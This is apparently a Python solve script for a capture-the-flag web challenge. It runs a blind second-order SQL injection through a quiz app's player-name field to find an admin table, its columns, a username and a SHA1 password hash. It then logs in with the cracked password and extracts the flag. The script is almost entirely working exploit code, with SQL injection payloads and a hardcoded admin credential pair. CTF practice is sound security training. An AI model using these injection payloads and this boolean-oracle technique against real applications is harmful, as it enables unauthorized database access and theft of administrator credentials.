#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
import random
import string


HOST = "https://bruzz.ctf.bzh/"

s = requests.session()

def get_random_string(length=6):
    # Used for random comment
    letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def is_true(inject):
    inject = inject+f" #{get_random_string()}"  # Random comment to avoid same name player
    s.post(f"{HOST}/register", json={"name": inject})  # Play
    rep = s.post(f"{HOST}/quizz", json={"responses": [0, 2, 1, 3]})  # Submit answers
    try:
        nb = int(rep.json()["msg"].split(">")[1].split("<")[0])  # Get players numbers
        return nb > 0
    except:
        return False


# Detect injection
assert(is_true("' OR '1'='1'") == True)
assert(is_true('" OR "1"="1"') == False)
# Discover table name
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs)") == True)
assert(is_true("' OR 1=(SELECT 1 FROM doesntexist)") == False)
# Discover attributes names
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs WHERE username != '1')") == True)
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs WHERE passwd != '1')") == True)
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs WHERE doesntexist != '1')") == False)
# Discover attributes values
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs WHERE username LIKE 'j%')") == True)
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs WHERE username LIKE 'ju%')") == True)
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs WHERE username LIKE 'ja%')") == False)
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs WHERE passwd LIKE 'f%')") == True)
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs WHERE passwd LIKE 'ff%')") == True)
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs WHERE passwd LIKE 'fa%')") == False)
print("[+] SQL injection is OK.")

# Confirm administrator credentials
assert(is_true("' OR 1=(SELECT 1 FROM administrateurs WHERE username = 'julien.lepers' AND passwd = 'ff19f7e740cdecdcc4e3bc182b8c9b8d19a7072c')") == True)
print("[+] Password is unchanged.")
# sha1(ouiouioui) = ff19f7e740cdecdcc4e3bc182b8c9b8d19a7072c

s.post(f"{HOST}/admin", json={"login": "julien.lepers", "password": "ouiouioui"})
rep = s.get(f"{HOST}/admin").text
flag = rep.split('<h3 class="pt-5 pb-5 text-center">')[1].split('</h3>')[0]
print(f"[+] Extracted flag: {flag}")
assert(flag == "BZHCTF{BurgerQuizSecondOrder}")
print(f"[+] Flag is correct")